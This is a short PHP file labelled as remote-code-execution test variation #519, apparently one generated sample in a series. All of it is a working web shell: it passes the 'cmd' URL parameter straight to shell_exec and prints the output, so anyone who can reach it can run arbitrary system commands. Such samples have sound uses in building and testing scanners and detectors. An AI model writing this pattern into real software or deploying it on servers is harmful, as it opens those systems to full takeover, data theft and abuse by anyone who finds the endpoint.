<?php
// RCE test variation #519
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>